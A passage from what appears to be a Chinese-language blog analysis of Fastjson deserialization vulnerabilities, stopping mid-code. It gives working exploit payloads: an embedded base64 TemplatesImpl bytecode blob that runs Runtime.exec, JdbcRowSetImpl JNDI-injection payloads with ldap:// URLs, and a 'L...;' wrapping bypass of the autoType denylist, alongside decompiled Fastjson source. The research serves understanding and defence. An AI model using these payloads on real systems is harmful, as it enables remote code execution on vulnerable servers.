JzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAMAAQAJAAoAAQALAAAAfAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAwAMAAAAGgAGAAAADgAEABEADQAUABAAEgARABMAFQAVAA0AAAAWAAIAEQAEAA4ADwABAAAAFgAQABEAAAASAAAAEAAC/wAQAAEHABMAAQcAFAQAAQAVABYAAgALAAAAPwAAAAMAAAABsQAAAAIADAAAAAYAAQAAABoADQAAACAAAwAAAAEAEAARAAAAAAABABcAGAABAAAAAQAZABoAAgAbAAAABAABABwAAQAVAB0AAgALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAAB8ADQAAACoABAAAAAEAEAARAAAAAAABABcAGAABAAAAAQAeAB8AAgAAAAEAIAAhAAMAGwAAAAQAAQAcAAEAIgAAAAIAIw==&quot;],&quot;_name&quot;:&quot;a.b&quot;,&quot;_tfactory&quot;:&#123; &#125;,&quot;_outputProperties&quot;:&#123; &#125;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br><br><span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(payload1, Feature.SupportNonPublicField);<br>System.out.println(obj);<br></code></pre></td></tr></table></figure><h4 id="2-JdbcRowSetImpl利用链"><a href="#2-JdbcRowSetImpl利用链" class="headerlink" title="2&gt;.JdbcRowSetImpl利用链"></a>2&gt;.JdbcRowSetImpl利用链</h4><h5 id="利用条件：-1"><a href="#利用条件：-1" class="headerlink" title="利用条件："></a>利用条件：</h5><p>JdbcRowSetImpl利用链为利用JNDI注入，利用条件为不用JAVA版本下RMI、LDAP限制条件，高版本使用高版本绕过技术</p><h5 id="利用链分析：-1"><a href="#利用链分析：-1" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>JdbcRowSetImpl#setAutoCommit()方法如下：</p><p><img src="/image/image-20220907103135441-16625178971631.png" alt="image-20220907103135441"></p><p>Fastjson会自动调用setAutoCommit()方法，conn默认为空，进入else执行this.conn &#x3D; this.connect();方法如下：</p><p><img src="/image/image-20220907103515820-16625181177893.png" alt="image-20220907103515820"></p><p>conn默认为空，若this.getDataSourceName() !&#x3D; null则进入else if,调用至lookup(this.getDataSourceName()</p><p>故此处存在JNDI注入，payload为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1099/badClassName&quot;</span>, <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="/image/image-20220907112138942-16625209008225.png" alt="image-20220907112138942"></p><h5 id="PAYLOAD-1"><a href="#PAYLOAD-1" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1099/badClassName&quot;</span>, <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="21-2-25"><a href="#21-2-25" class="headerlink" title="21.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.41"></a>21.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.41</h3><h4 id="PAYLOAD1"><a href="#PAYLOAD1" class="headerlink" title="PAYLOAD1"></a>PAYLOAD1</h4><h5 id="利用条件：-2"><a href="#利用条件：-2" class="headerlink" title="利用条件："></a>利用条件：</h5><p>开启autoTypeSupport,影响版本1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.41</p><h5 id="利用链分析：-2"><a href="#利用链分析：-2" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>FastJSON1.2.24</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">ref = lexer.scanSymbol(<span class="hljs-built_in">this</span>.symbolTable, <span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>Class&lt;?&gt; clazz = TypeUtils.loadClass(ref, <span class="hljs-built_in">this</span>.config.getDefaultClassLoader());<br></code></pre></td></tr></table></figure><p>FastJSON1.2.25</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">ref = lexer.scanSymbol(<span class="hljs-built_in">this</span>.symbolTable, <span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>Class&lt;?&gt; clazz = <span class="hljs-built_in">this</span>.config.checkAutoType(ref, (Class)<span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><p>获取类对象的方法由 TypeUtils.loadClass 变成了this.config.checkAutoType</p><p>Fastjson1.2.25中com.alibaba.fastjson.parser.ParserConfig类进行了修改修改，添加属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> autoTypeSupport; <span class="hljs-comment">//控制是否可进行反序列化，默认为false</span><br><span class="hljs-keyword">private</span> String[] denyList;<span class="hljs-comment">//黑名单</span><br><span class="hljs-keyword">private</span> String[] acceptList;<span class="hljs-comment">//白名单</span><br></code></pre></td></tr></table></figure><p><img src="/image/image-20220908100501152-16626027031855.png" alt="image-20220908100501152"></p><p>构造方法中对黑白名单进行赋值</p><p><img src="/image/image-20220908102206222-16626037279307.png" alt="image-20220908102206222"></p><p>com.alibaba.fastjson.parser.DefaultJSONParser中parseObject()方法中调用ParserConfig#checkAutoType()</p><p><img src="/image/image-20220908102648098-16626040098489.png" alt="image-20220908102648098"></p><p>checkAutoType()中对autoTypeSupport进行判断，若为true则先进行白名单校验，若为白名单内则进入TypeUtils.loadClass，后再进行黑名单校验，若在黑名单中则抛出异常，若未在黑名单中则在Map中查找类</p><p><img src="/image/image-20220908100111279-16626024730933.png" alt="image-20220908100111279"></p><p>若autoTypeSupport为false,则进行黑名单判断，再进行白名单判断，最后若autoTypeSupport&#x3D;true，会再一次进行判断然后进入到TypeUtils.loadClass中</p><p><img src="/image/image-20220908094528661-16626015314011.png" alt="image-20220908094528661"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.autoTypeSupport) &#123;<br>    String accept;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.denyList.length; ++i) &#123;<br>        accept = <span class="hljs-built_in">this</span>.denyList[i];<br>        <span class="hljs-keyword">if</span> (className.startsWith(accept)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.acceptList.length; ++i) &#123;<br>        accept = <span class="hljs-built_in">this</span>.acceptList[i];<br>        <span class="hljs-keyword">if</span> (className.startsWith(accept)) &#123;<br>            clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader);<br>            <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> clazz;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.autoTypeSupport || expectClass != <span class="hljs-literal">null</span>) &#123;<br>    clazz = TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader);<br>&#125;<br><br><span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;<br>            <span class="hljs-keyword">return</span> clazz;<br>        &#125;<br><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>com.alibaba.fastjson.util.TypeUtils#loadClass()中对[ L ;进行了处理，而其中在处理L ;的时候存在了逻辑漏洞，可以在className的前后分别加上L ;来进行绕过</p><p><img src="/image/image-20220908111904169-166260714586611.png" alt="image-20220908111904169"></p><h5 id="PAYLOAD-2"><a href="#PAYLOAD-2" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JAVA">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);  <span class="hljs-comment">//开启autoTypeSupport</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>, <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><h4 id="PAYLOAD2"><a href="#PAYLOAD2" class="headerlink" title="PAYLOAD2"></a>PAYLOAD2</h4><h5 id="利用条件：-3"><a href="#利用条件：-3" class="headerlink" title="利用条件："></a>利用条件：</h5><p>1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32 未开启autoTypeSupport</p><p>1.2.33 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32  autoTypeSupport开启或未开启均可利用</p><h5 id="利用链分析：-3"><a href="#利用链分析：-3" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>ParserConfig#checkAutoType()方法中若autoTypeSupport为false,则会运行到Class&lt;?&gt; clazz &#x3D; TypeUtils.getClassFromMapping(typeName);若clazz为空则会运行clazz &#x3D; this.deserializers.findClass(typeName);其中deserializers当类初始化时会添加数据，若目标类在ParserConfig类初始化添加类map中，则checkAutoType()方法可return目标类：具体如下</p><p><img src="/image/image-20220908155129860.png" alt="image-20220908155129860"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-title function_">ParserConfig</span><span class="hljs-params">(ASMDeserializerFactory asmFactory, ClassLoader parentClassLoader)</span> &#123;<br>    <span class="hljs-built_in">this</span>.deserializers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IdentityHashMap</span>();<br>    <span class="hljs-built_in">this</span>.asmEnable = !ASMUtils.IS_ANDROID;<br>    <span class="hljs-built_in">this</span>.symbolTable = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SymbolTable</span>(<span class="hljs-number">4096</span>);<br>    <span class="hljs-built_in">this</span>.autoTypeSupport = AUTO_SUPPORT;<br>    <span class="hljs-built_in">this</span>.denyList = <span class="hljs-string">&quot;bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework&quot;</span>.split(<span class="hljs-string">&quot;,&quot;</span>);<br>    <span class="hljs-built_in">this</span>.acceptList = AUTO_TYPE_ACCEPT_LIST;<br>    <span class="hljs-keyword">if</span> (asmFactory == <span class="hljs-literal">null</span> &amp;&amp; !ASMUtils.IS_ANDROID) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (parentClassLoader == <span class="hljs-literal">null</span>) &#123;<br>                asmFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ASMDeserializerFactory</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ASMClassLoader</span>());<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                asmFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ASMDeserializerFactory</span>(parentClassLoader);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (ExceptionInInitializerError var4) &#123;<br>        &#125; <span class="hljs-keyword">catch</span> (AccessControlException var5) &#123;<br>        &#125; <span class="hljs-keyword">catch</span> (NoClassDefFoundError var6) &#123;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.asmFactory = asmFactory;<br>    <span class="hljs-keyword">if</span> (asmFactory == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-built_in">this</span>.asmEnable = <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//deserializerst添加类</span><br>    <span class="hljs-built_in">this</span>.deserializers.put(SimpleDateFormat.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Timestamp.class, SqlDateDeserializer.instance_timestamp);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Date.class, SqlDateDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Time.class, TimeDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(java.util.Date.class, DateCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Calendar.class, CalendarCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(XMLGregorianCalendar.class, CalendarCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(JSONObject.class, MapDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(JSONArray.class, CollectionCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Map.class, MapDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(HashMap.class, MapDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(LinkedHashMap.class, MapDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(TreeMap.class, MapDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(ConcurrentMap.class, MapDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(ConcurrentHashMap.class, MapDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Collection.class, CollectionCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(List.class, CollectionCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(ArrayList.class, CollectionCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Object.class, JavaObjectDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(String.class, StringCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(StringBuffer.class, StringCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(StringBuilder.class, StringCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Character.TYPE, CharacterCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Character.class, CharacterCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Byte.TYPE, NumberDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Byte.class, NumberDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Short.TYPE, NumberDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Short.class, NumberDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Integer.TYPE, IntegerCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Integer.class, IntegerCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Long.TYPE, LongCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Long.class, LongCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(BigInteger.class, BigIntegerCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(BigDecimal.class, BigDecimalCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Float.TYPE, FloatCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Float.class, FloatCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Double.TYPE, NumberDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Double.class, NumberDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Boolean.TYPE, BooleanCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Boolean.class, BooleanCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Class.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(<span class="hljs-type">char</span>[].class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CharArrayCodec</span>());<br>    <span class="hljs-built_in">this</span>.deserializers.put(AtomicBoolean.class, BooleanCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(AtomicInteger.class, IntegerCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(AtomicLong.class, LongCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(AtomicReference.class, ReferenceCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(WeakReference.class, ReferenceCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(SoftReference.class, ReferenceCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(UUID.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(TimeZone.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Locale.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Currency.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(InetAddress.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Inet4Address.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Inet6Address.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(InetSocketAddress.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(File.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(URI.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(URL.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Pattern.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Charset.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(JSONPath.class, MiscCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Number.class, NumberDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(AtomicIntegerArray.class, AtomicCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(AtomicLongArray.class, AtomicCodec.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(StackTraceElement.class, StackTraceElementDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Serializable.class, JavaObjectDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Cloneable.class, JavaObjectDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Comparable.class, JavaObjectDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.deserializers.put(Closeable.class, JavaObjectDeserializer.instance);<br>    <span class="hljs-built_in">this</span>.addItemsToDeny(DENYS);<br>    <span class="hljs-built_in">this</span>.addItemsToAccept(AUTO_TYPE_ACCEPT_LIST);<br>&#125;<br></code></pre></td></tr></table></figure><p>代码继续运行，运行到thisObj &#x3D; deserializer.deserialze(this, clazz, fieldName);进入到MiscCodec#deserialze()方法</p><p><img src="/image/image-20220909104428239-16626914698001.png" alt="image-20220909104428239"></p><p>MiscCodec#deserialze()方法，取出JSON串中var值，然后执行TypeUtils.loadClass(),具体如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">deserialze</span><span class="hljs-params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> &#123;<br>    <span class="hljs-type">JSONLexer</span> <span class="hljs-variable">lexer</span> <span class="hljs-operator">=</span> parser.lexer;<br>    String className;<br>    <span class="hljs-keyword">if</span> (clazz == InetSocketAddress.class) &#123;<span class="hljs-comment">//判断clazz 是否为InetSocketAddress.class</span><br>......<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        Object objVal;<br>        <span class="hljs-keyword">if</span> (parser.resolveStatus == <span class="hljs-number">2</span>) &#123;<br>            parser.resolveStatus = <span class="hljs-number">0</span>;<br>            parser.accept(<span class="hljs-number">16</span>);<br>            <span class="hljs-keyword">if</span> (lexer.token() != <span class="hljs-number">4</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;syntax error&quot;</span>);<br>            &#125;<br><span class="hljs-comment">//判断val值，若不为则抛出异常</span><br>            <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;syntax error&quot;</span>);<br>            &#125;<br><br>            lexer.nextToken();<br>            parser.accept(<span class="hljs-number">17</span>);<br>            objVal = parser.parse();<br>            parser.accept(<span class="hljs-number">13</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            objVal = parser.parse();<br>        &#125;<br><br>        String strVal;<br>        <span class="hljs-keyword">if</span> (objVal == <span class="hljs-literal">null</span>) &#123;<br>            strVal = <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (!(objVal <span class="hljs-keyword">instanceof</span> String)) &#123;<br>                <span class="hljs-keyword">if</span> (objVal <span class="hljs-keyword">instanceof</span> JSONObject &amp;&amp; clazz == Map.Entry.class) &#123;<br>                    <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> (JSONObject)objVal;<br>                    <span class="hljs-keyword">return</span> jsonObject.entrySet().iterator().next();<br>                &#125;<br><br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;expect string&quot;</span>);<br>            &#125;<br><br>            strVal = (String)objVal;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (strVal != <span class="hljs-literal">null</span> &amp;&amp; strVal.length() != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (clazz == UUID.class) 